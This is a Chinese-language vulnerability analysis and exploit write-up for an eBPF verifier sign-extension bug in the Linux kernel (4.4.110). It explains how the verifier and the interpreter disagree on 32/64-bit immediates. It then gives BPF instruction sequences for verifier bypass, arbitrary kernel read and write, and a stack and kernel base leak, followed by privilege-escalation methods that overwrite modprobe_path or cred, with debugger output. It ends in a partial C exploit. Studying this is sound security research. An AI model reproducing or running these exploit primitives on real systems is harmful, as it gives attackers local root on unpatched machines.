###  漏洞分析
漏洞成因是内核在对 `ALU`指令和 `JMP`指令在检测时和真正运行的语义解释不一样导致。
理论上虚拟执行和真实执行的执行路径应该是完全一致的，如果步骤2安全校验过程中的虚拟执行路径和步骤4
`bpf`的真实执行路径不完全一致的话，则会发生以下问题，示例如下：
    1.BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),             /* r9 = (u32)0xFFFFFFFF   */
    2.BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),   /* if (r9 == -1) {        */
    3.BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */
    4.BPF_EXIT_INSN()
    5.……
第一条指令是个赋值语句，将 `oxffffffff`这个值赋值给 `r9`；
第二条指令是个条件跳转指令，如果 `r9`等于 `0xffffffff`，则退出程序，终止执行；如果 `r9`不等于
`0xffffffff`，则跳过后面2条指令继续执行第5条指令。
虚拟执行的时候，`do_check`检测到第2条指令等式恒成立，所以认为 `BPF_JNE`的跳转永远不会发生，第 4
条指令之后的指令永远不会执行，所以检测结束，`do_check`返回成功。
下面我们分析一下`do_check`中对 `ALU`指令进行检查
，`check_alu_op`函数会对操作数进行检查，该代码的最后一个分支处会对如下两种情况进行检查：
  * BPF_ALU64|BPF_MOV|BPF_K，把 64 位立即数赋值给目的寄存器
  * BPF_ALU|BPF_MOV|BPF_K，把 32 位立即数赋值给目的寄存器
    if (BPF_SRC(insn->code) == BPF_X) {
        if (BPF_CLASS(insn->code) == BPF_ALU64) {
            /* case: R1 = R2
                     * copy register state to dest reg
                     */
            regs[insn->dst_reg] = regs[insn->src_reg];
        } else {
            if (is_pointer_value(env, insn->src_reg)) {
                verbose("R%d partial copy of pointer\n",
                        insn->src_reg);
                return -EACCES;
            }
            regs[insn->dst_reg].type = UNKNOWN_VALUE;
            regs[insn->dst_reg].map_ptr = NULL;
        }
    } else {
        /* case: R = imm
                 * remember the value we stored into this reg
                 */
        regs[insn->dst_reg].type = CONST_IMM;
        regs[insn->dst_reg].imm = insn->imm;
    }
可以看到对于 `BPF_ALU64`或者 `BPF_ALU`最后都是 将 立即数 `insn->imm`赋值给
`regs[insn->dst_reg].imm`。而 `imm`是 32位有符号立即数：
    struct bpf_insn {
        __u8    code;        /* opcode */
        __u8    dst_reg:4;    /* dest register */
        __u8    src_reg:4;    /* source register */
        __s16    off;        /* signed offset */
        __s32    imm;        /* signed immediate constant */
    };
所以就导致当我们调用 `BPF_ALU64|BPF_MOV|BPF_K`指令时，传入的 值是 `0xffffffff`给寄存器，会只是一个有符号的
32位数据。  
而在 `eBPF`程序真实执行时，对这两条指令的解释如下(`__bpf_prog_run`)：
        ALU_MOV_K:
            DST = (u32) IMM;
            CONT;
        ALU64_MOV_K:
            DST = IMM;
            CONT;
可以看到 `ALU_MOV_K`，仅仅是将32位无符号的数传递给了目的寄存器，而 `ALU64_MOV_X`却是将立即数 `IMM`赋值给了
64位目的寄存器，这里如果 `IMM`是 32位数据，会对其进行一个 `sign extension`，导致这里 `DST`获得值与原 `IMM`并不相等。  
所以在`do_check`检查时，这两条指令并无区别。但是在实际解释执行时，这两条指令的结果并不相同。运用这个差异即可对 `do_check`进行绕过。
在对 `BPF_JMP|BPF_JNE|BPF_IMM`指令解释时，当 `IMM`为有符号或无符号时，因为 `sign extension`，`DST !=
IMM`结果是不一样的：
        JMP_JNE_K:
            if (DST != IMM) {
                insn += insn->off;
                CONT_JMP;
            }
            CONT;
但是，这是怎么确定在赋值时，会有符号拓展，从源码上我无法直接看到。所以还是得看汇编最好，真实执行时的汇编指令却如下所示：
     ► 0xffffffff81173e7f    movsxd rdx, dword ptr [rbx + 4]
       0xffffffff81173e83    and    eax, 0xf
       0xffffffff81173e86    cmp    qword ptr [rbp + rax*8 - 0x278], rd
       0xffffffff81173e8e    je     0xffffffff8117493c  x/10xg $rbx+0x4
    0xffffc90000093034:     0x000000b7ffffffff      0x0000009500000000
可以看到这里 第一条指令赋值时 汇编使用的是 `movsxd`，这就是会进行符号拓展。可以看到这里原本的值为
`0xffffffff`，但是执行完该指令，进行了符号拓展，真正赋值的值为 `0xffffffffffffffff`。所以，后续的第2条指令
判断会永远不成立。
真实执行的时候，由于一个符号拓展的 `bug`，导致第2条指令中的等式不成立，于是
`cpu`就跳转到第5条指令继续执行，这里是漏洞产生的原因，这4条指令，可以绕过
`BPF`的代码安全检查。当安全检查被绕过了，用户就可以随意往内核中注入代码，也就能够提权。
## 漏洞利用
上述漏洞分析已经分析的很完整，即我们可以在输入的 `bpf`指令前4条指令用于绕过
`do_check`。在随后的指令中用于执行恶意指令。那么后续提权的恶意指令应该怎么布置呢？此处，以`4.4.110`内核版本进行`exp`的编写及分析。
###  BPF指令静态编写
这里讲述一下，如何编写 `exp`中需要是用到的各项功能。建议可以参考 `linux`源码中
`sample/bpf`目录下的示例，其给出了各项指令，只需要调用即可。
**绕过do_check**
        BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),               \    //mov32 r2, 0xffffffff
        BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),     \    //if(r2 == 0xffffffff){exit(0)}else{jmp 2}
        BPF_MOV64_IMM(BPF_REG_0, 0),                         \
        BPF_EXIT_INSN()
**寄存器获取map值**
    BPF_LD_MAP_FD(BPF_REG_9, mapfd),        //r9=mapfd
    #define BPF_GET_MAP_FD(idx, dst)                                                                    \
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),        /*mov64 reg1, reg9=mapfd*/                          \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),       /*mov64 reg2, fp */                                 \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),      /*reg2 = reg2-4=fp-4*/                              \
        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),     /*(u64 *)(fp-4) = idx*/                             \
        BPF_RAW_INSN(BPF_JMP|BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), //获取map[idx]的值,r0存储返回值 \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),      /*if(r0 == 0){exit(0)}else{jmp 1}*/                 \
        BPF_EXIT_INSN(),                                                                                \
        BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0)      // dst = *(u64 *)(r0)=map[0]
**r2存储map[2]地址**
            BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0=&map[2]               */
            BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0 for exit(0)
**获取栈地址**
            BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),                //if(r6==0){r2=map[2]=r10=fp}else{exit(0)}
            BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),        //*r2=map[2]=r10=fp
            BPF_EXIT_INSN(),
`r10`是 `fp`，其值是一个内核栈地址，`r2`的值是 `map[2]`的地址。相当于将 `r10`的值 赋值给 `map[2]`
**任意读**
            //read
            BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),            //if(op==1)
            BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0x0),   // r3 = *(r7)
            BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),        // *r2=map[2]=r3=*(r7)=*(addr)
            BPF_EXIT_INSN(),
这里 `r7`的值是需要读取的 地址 `addr`，`r2`的值是 `map[2]`的地址，相当于把 `addr`的值 赋值给 `map[2]`，用户态读取
`map[2]`即可获得 `addr`的值
**任意写**
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),                            //*r7=r8
            BPF_EXIT_INSN(),
`r7`的值是需要写的地址 `addr`,`r8`的值是 需要写入的值。  
利用 `r6`作为指令判断，当`map[0]`输入为 0、1、2时，`r6`也分别为对应的值。
  * 当 `r6==0`时，可以将 `r7`所指向的值赋值给 `r2`，而这里 `r7`的值由 `map[1]`控制，而 `r2`的值由 `r0==map[2]`，所以这里就相当于实现如下指令，能够实现一个任意地址读。
    map[2] = *map[1]
  * 当`r6==1`时，将`r10`所指向的值赋值给`r2`，而这里`r10`为`rbp`，也就相当于将`rbp`的值赋值给了 `map[2]`，可以读取栈地址。
  * 当`r6==2`时，将 `r8`的值赋值给 `r7`所指向的地址，实现了一个任意地址写。
在用户空间创建的 `map[0]`用来存放操作指令，`map[1]`用来存放需要进行读写的内存地址，`map[2]`用来存放泄露的地址。
`map[0].value = 0`，表示读取 `map[1]`中存放的地址的内容，放到 `map[2]`中。这里就实现了任意地址读。
`map[0].value = 1`，表示读取内核栈基址，放到 `map[2]`中。这里就实现了泄露内核基地址。
`map[0].value = 2`，表示将 `map[2]`的值写入到 `map[1]`中的地址中。实现了任意地址写。
这里 `r6`用于 `op`，`r7`用于输入 `address`，`r8`用于输入或获取`value`。
###  利用方法
这里原`exp`中是使用覆写
`cred`结构体来提权。而这里已经实现了任意地址读和任意地址写，所以这里能够用于提权的方法十分多样，下面分别讲述两种提权方法：一种是简单的覆盖
`modprobe_path`，另一种即覆写 `cred`。
#### **覆写modprobe_path**
这种方法十分简单。首先需要泄露内核基址，这里由于我们有一个任意地址读，而经过调试 `r10(即fp)`的值加上`0x28`处的地址的值就是
`__bpf_prog_run`函数的返回地址。所以我们可以直接将返回地址泄露出来，以此来获得内核基址。同时，由于有一个任意地址写，所以可以直接向
`modprobe_path`的地址写上 `/tmp/l.sh`的16进制数字。完成覆写 `modprobe_path`。
下面是执行 `r3 = *(u64 *)(fp+0x28); *(u64 *)r2=r3;`指令时的汇编，可以看到此时 `fp+0x28`的值被存储到了
`RAX`中是返回地址 `0xffffffff817272bc`，而 `r2`此时的值为 `0xffff8800077e59f0`，该地址是
`map[2]`的地址，现在的值为 0。而执行完这两条指令后 `map[2]`的值已经变为返回地址`0xffffffff817272bc`。
    *RAX  0xffffffff817272bc ◂— test   byte ptr [r13 + 2], 4 /* 0xad850f040245f641 */
     RBX  0xffffc90000002140 ◂— jnp    0xffffc90000002174 /* 0x327b; '{2' */
     RCX  0x28
     RDX  0x3
     RDI  0xffff8800077e5980 ◂— add    al, byte ptr [rax] /* 0x200000002 */
     RSI  0xffff88000fadfc8c ◂— add    al, byte ptr [rax] /* 0x4f16b58d00000002 */
     R8   0x0
     R9   0xffff88000b401600 ◂— and    byte ptr [rdx + 1], ah /* 0x1a220 */
     R10  0xffff88000fa9f300 ◂— 0
     R11  0xffff880000bec400 ◂— 0
     R12  0xffffffff81a33460 —▸ 0xffffffff81174779 ◂— mov    rsi, -0x7e5ccbc0 /* 0x4881a33440c6c748 */
     R13  0x0
     R14  0xffff880000bec400 ◂— 0
     R15  0x40
     RBP  0xffff88000fadfcb0 —▸ 0xffff88000fadfcf8 —▸ 0xffff88000fadfda0 —▸ 0xffff88000fadfdc0 —▸ 0xffff88
    000fadfe38 ◂— ...
     RSP  0xffff88000fadfa30 ◂— 0x246
    *RIP  0xffffffff811744a1 ◂— mov    qword ptr [rbp + rdx*8 - 0x278], rax /* 0xfffffd88d5848948 */
    ──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
       0xffffffff8117448c    shr    al, 4
       0xffffffff8117448f    and    eax, 0xf
       0xffffffff81174492    and    edx, 0xf
       0xffffffff81174495    mov    rax, qword ptr [rbp + rax*8 - 0x278]
       0xffffffff8117449d    mov    rax, qword ptr [rax + rcx]
     ► 0xffffffff811744a1    mov    qword ptr [rbp + rdx*8 - 0x278], rax
       0xffffffff811744a9    movzx  eax, byte ptr [rbx]
       0xffffffff811744ac    jmp    qword ptr [r12 + rax*8]
    //返回地址
    pwndbg> x/2xg $rbp
    0xffff88000fadfcb0:     0xffff88000fadfcf8      0xffffffff817272bc
    //r2存储的值是 map[2]的地址
    pwndbg> x/10xg $rbp-0x278+2*8
    0xffff88000fadfa48:     0xffff8800077e59f0      0xffff88000fadfa90
    //执行前map[2]的结果为0
    pwndbg> x/10xg 0xffff8800077e59f0
    0xffff8800077e59f0:     0x0000000000000000      0x0000000000000000
    //执行后map[2]中存储了返回地址，泄露地址成功
    pwndbg> x/10xg 0xffff8800077e59f0
    0xffff8800077e59f0:     0xffffffff817272bc      0x0000000000000000
#### **覆写 cred**
覆写 `cred`关键就是如何找到
`cred`所在的地址。这里最常见的思路就是通过任意读，不断爆破其地址，但是由于任意读每次只能读8字节，所以爆破稍微需要一点时间。然后参考别人的`exp`，又有两种思路：一种是根据
内核栈地址，找到位于栈顶的 `tread_info`地址，其第一个数据就存储了 `task_struct`地址，再获得
`cred`结构体地址；另一种是根据位于 `bpf_reg_1`中的 `skbuff`结构体，其中存储了 `task_struct`结构体，然后获得
`cred`结构体。第2种，这里我不太清楚为什么 `bpf_reg_1`中会存储 `skbuff`地址，所以我不做讲述。重点使用第1种方法。
首先简述一下内核栈与 `thread_info`的关系。
由于`task_struct`随着版本的更新，其一直在不断增大，所以直接将 `task_struct`放入栈中会十分浪费栈空间，因此选择将
`task_struct`地址存储到 `threadinfo`结构体中，而将 `thread_info`放入栈中。`thread_info`结构体如下：
    struct thread_info {
        unsigned long        flags;        /* low level flags */
        mm_segment_t        addr_limit;    /* address limit */
        struct task_struct    *task;        /* main task structure */
        int            preempt_count;    /* 0 => preemptable,  bug */
        int            cpu;        /* cpu */
    };
而 `thread_info`与 内核栈 `stack`一起组成了一个 `thread_union`结构体：
    union thread_union {
        struct thread_info thread_info;
        unsigned long stack[THREAD_SIZE/sizeof(long)];
    };
    #define THREAD_SIZE        16384
    #define THREAD_START_SP        (THREAD_SIZE - 16)
内核定义了一个 `thread_union`联合体，将 `thread_info`和 `stack`共用一块内存区域。而
`thread_size`就是内核栈的大小，如下图所示：
那么内核是如何获取 `task_struct`结构呢，内核实现了一个 `current`宏：
    #define get_current() (current_thread_info()->task)
    #define current get_current()
    /*
     * how to get the current stack pointer from C
     */
    register unsigned long current_stack_pointer asm ("sp");
    /*
     * how to get the thread information struct from C
     */
    static inline struct thread_info *current_thread_info(void) __attribute_const__;
    static inline struct thread_info *current_thread_info(void)
    {
        return (struct thread_info *)
            (current_stack_pointer & ~(THREAD_SIZE - 1));
    }
可以看到其获取了一个内核栈地址 `sp`，然后通过对齐 `THREAD_SIZE`就可以获取 `thread_info`结构的基地址了。这里的
`THREAD_SIZE`为 `16384`即 `0x4000`，所以后面用 `0x4000`来对齐。
所以这里如果想找到 `cred`的地址，可以先泄露一个内核栈地址，再通过对齐获得 `thread_info`地址，再获得
`task_struct`地址，最后获得 `cred`地址。
得到 `task_struct`之后还需要确定 `cred`在
`task_struct`中的偏移，这里目前没有找到好的办法，不同版本各有不同，需要自行调试。
###  EXP
覆写 `modprobe_path`
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char buffer[64];
    int sockets[2];
    int mapfd, progfd;
    int doredact = 0;
    size_t kernel_base = 0x0;
    size_t modprobe_path = 0xe4c800;
    #define LOG_BUF_SIZE 65536
    #define PHYS_OFFSET 0xffff880000000000
    char bpf_log_buf[LOG_BUF_SIZE];
    void Err(const char *fmt, ...){
        va_list args;
        va_start(args, fmt);
        fprintf(stdout, "[!] ");
        vfprintf(stdout, fmt, args);
        va_end(args);
        exit(1);
    }
    static __u64 ptr_to_u64(void *ptr)
    {
        return (__u64) (unsigned long) ptr;
    }
    int bpf_prog_load(enum bpf_prog_type prog_type,
              const struct bpf_insn *insns, int prog_len,
              const char *license, int kern_version)
    {
        union bpf_attr attr = {
            .prog_type = prog_type,
            .insns = ptr_to_u64((void *) insns),
            .insn_cnt = prog_len / sizeof(struct bpf_insn),